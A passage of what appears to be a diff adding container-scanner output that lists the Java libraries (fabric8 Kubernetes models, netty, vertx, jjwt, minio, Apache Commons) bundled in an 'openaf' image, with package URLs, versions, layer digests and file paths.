+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-discovery-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [48]  ╭ Name      : io.fabric8:kubernetes-model-events 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-events@7.6.1 
+      │                 │       │            ╰ UID : 6726e1338d377c10 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-events-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [49]  ╭ Name      : io.fabric8:kubernetes-model-extensions 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-extensions@7.6.1 
+      │                 │       │            ╰ UID : d66d82d1529da9f7 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-extensions-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [50]  ╭ Name      : io.fabric8:kubernetes-model-flowcontrol 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-flowcontrol@7.6.1 
+      │                 │       │            ╰ UID : 245fda9fbe5cf3f2 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-flowcontrol-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [51]  ╭ Name      : io.fabric8:kubernetes-model-gatewayapi 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-gatewayapi@7.6.1 
+      │                 │       │            ╰ UID : 58f23eb0eaff6a62 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-gatewayapi-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [52]  ╭ Name      : io.fabric8:kubernetes-model-metrics 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-metrics@7.6.1 
+      │                 │       │            ╰ UID : c2e013a80d8973fa 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-metrics-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [53]  ╭ Name      : io.fabric8:kubernetes-model-networking 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-networking@7.6.1 
+      │                 │       │            ╰ UID : f01e540bc37ff3b1 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-networking-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [54]  ╭ Name      : io.fabric8:kubernetes-model-node 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-node@7.6.1 
+      │                 │       │            ╰ UID : a14267b1835c244b 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-node-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [55]  ╭ Name      : io.fabric8:kubernetes-model-policy 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-policy@7.6.1 
+      │                 │       │            ╰ UID : 7960f2ecf5819f36 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-policy-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [56]  ╭ Name      : io.fabric8:kubernetes-model-rbac 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-rbac@7.6.1 
+      │                 │       │            ╰ UID : 1205058b35fe8e3e 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-rbac-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [57]  ╭ Name      : io.fabric8:kubernetes-model-resource 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-resource@7.6.1 
+      │                 │       │            ╰ UID : a68de97f3676b2cf 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-resource-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [58]  ╭ Name      : io.fabric8:kubernetes-model-scheduling 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-scheduling@7.6.1 
+      │                 │       │            ╰ UID : 51d95e478273d968 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-scheduling-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [59]  ╭ Name      : io.fabric8:kubernetes-model-storageclass 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-storageclass@7.6.1 
+      │                 │       │            ╰ UID : e5f7f68046af1364 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-storageclass-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [60]  ╭ Name      : io.fabric8:zjsonpatch 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/zjsonpatch@7.6.1 
+      │                 │       │            ╰ UID : a63db4e3ccdccb3e 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/zjsonpatch-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [61]  ╭ Name      : io.jsonwebtoken:jjwt-api 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-api@0.13.0 
+      │                 │       │            ╰ UID : fe506a80a2899a4a 
+      │                 │       ├ Version   : 0.13.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [62]  ╭ Name      : io.jsonwebtoken:jjwt-gson 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-gson@0.13.0 
+      │                 │       │            ╰ UID : cc7c47a353e36bec 
+      │                 │       ├ Version   : 0.13.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [63]  ╭ Name      : io.jsonwebtoken:jjwt-impl 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-impl@0.13.0 
+      │                 │       │            ╰ UID : fb75cc968ac3dc0d 
+      │                 │       ├ Version   : 0.13.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [64]  ╭ Name      : io.minio:minio 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.minio/minio@9.0.0 
+      │                 │       │            ╰ UID : c3d88819980fb569 
+      │                 │       ├ Version   : 9.0.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/minio-9.0.0.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [65]  ╭ Name      : io.netty:netty-buffer 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-buffer@4.2.12.Final 
+      │                 │       │            ╰ UID : cc0519ac7d6544d3 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-buffer-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [66]  ╭ Name      : io.netty:netty-codec-base 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-base@4.2.12.Final 
+      │                 │       │            ╰ UID : c913651beadac915 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-codec-base-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [67]  ╭ Name      : io.netty:netty-codec-compression 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.12.Final 
+      │                 │       │            ╰ UID : d5a032dd793fa143 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-codec-compression-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [68]  ╭ Name      : io.netty:netty-codec-dns 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.12.Final 
+      │                 │       │            ╰ UID : d1018bca82fa2aba 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-codec-dns-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [69]  ╭ Name      : io.netty:netty-codec-http 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+      │                 │       │            ╰ UID : 42139b2b89dda2f4 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [70]  ╭ Name      : io.netty:netty-codec-http2 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.12.Final 
+      │                 │       │            ╰ UID : c9374114bd085c75 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-codec-http2-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [71]  ╭ Name      : io.netty:netty-codec-socks 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-socks@4.2.12.Final 
+      │                 │       │            ╰ UID : 6dac766b028678d7 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-codec-socks-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [72]  ╭ Name      : io.netty:netty-common 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-common@4.2.12.Final 
+      │                 │       │            ╰ UID : 8d08b61b7945b6a0 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-common-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [73]  ╭ Name      : io.netty:netty-handler 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-handler@4.2.12.Final 
+      │                 │       │            ╰ UID : 9402666d1399aa5 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-handler-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [74]  ╭ Name      : io.netty:netty-handler-proxy 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final 
+      │                 │       │            ╰ UID : 8344d1e8c7524c10 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-handler-proxy-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [75]  ╭ Name      : io.netty:netty-resolver 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-resolver@4.2.12.Final 
+      │                 │       │            ╰ UID : d7528834b57654bb 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-resolver-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [76]  ╭ Name      : io.netty:netty-resolver-dns 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-resolver-dns@4.2.12.Final 
+      │                 │       │            ╰ UID : 3f10c8fba6a3f35a 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-resolver-dns-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [77]  ╭ Name      : io.netty:netty-transport 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-transport@4.2.12.Final 
+      │                 │       │            ╰ UID : dc0c50a667b2c4b9 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-transport-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [78]  ╭ Name      : io.netty:netty-transport-native-unix-common 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-transport-native-unix-common@4.2.
+      │                 │       │            │       12.Final 
+      │                 │       │            ╰ UID : cd2b8af680c1bef9 
+      │                 │       ├ Version   : 4.2.12.Final 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-transport-native-unix-common-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [79]  ╭ Name      : io.sigpipe:jbsdiff 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.sigpipe/jbsdiff@1.0 
+      │                 │       │            ╰ UID : e618a95843fba36b 
+      │                 │       ├ Version   : 1.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [80]  ╭ Name      : io.vertx:vertx-auth-common 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-auth-common@4.5.24 
+      │                 │       │            ╰ UID : 4953632041865418 
+      │                 │       ├ Version   : 4.5.24 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/vertx-auth-common-4.5.24.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [81]  ╭ Name      : io.vertx:vertx-core 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-core@4.5.24 
+      │                 │       │            ╰ UID : afaef31c626f9650 
+      │                 │       ├ Version   : 4.5.24 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/vertx-core-4.5.24.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [82]  ╭ Name      : io.vertx:vertx-web-client 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-web-client@4.5.24 
+      │                 │       │            ╰ UID : df16d1babd29b056 
+      │                 │       ├ Version   : 4.5.24 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/vertx-web-client-4.5.24.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [83]  ╭ Name      : io.vertx:vertx-web-common 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-web-common@4.5.24 
+      │                 │       │            ╰ UID : 95ad12caeb922cc7 
+      │                 │       ├ Version   : 4.5.24 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/vertx-web-common-4.5.24.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [84]  ╭ Name      : jakarta.activation:jakarta.activation-api 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/jakarta.activation/jakarta.activation-api@1.2.2 
+      │                 │       │            ╰ UID : 5d2ee0e1a121653f 
+      │                 │       ├ Version   : 1.2.2 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [85]  ╭ Name      : javax.xml.bind:jaxb-api 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/javax.xml.bind/jaxb-api@2.3.1 
+      │                 │       │            ╰ UID : d465243f613cf5b8 
+      │                 │       ├ Version   : 2.3.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [86]  ╭ Name      : jline:jline 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/jline/jline@2.14.6 
+      │                 │       │            ╰ UID : 509c1c4b5bcd42a1 
+      │                 │       ├ Version   : 2.14.6 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [87]  ╭ Name      : org.apache.commons:commons-collections4 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-collections4@4.5.0 
+      │                 │       │            ╰ UID : 72513cdccf1d063 
+      │                 │       ├ Version   : 4.5.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [88]  ╭ Name      : org.apache.commons:commons-compress 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-compress@1.28.0 
+      │                 │       │            ╰ UID : a82eeb62843349ae 
+      │                 │       ├ Version   : 1.28.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
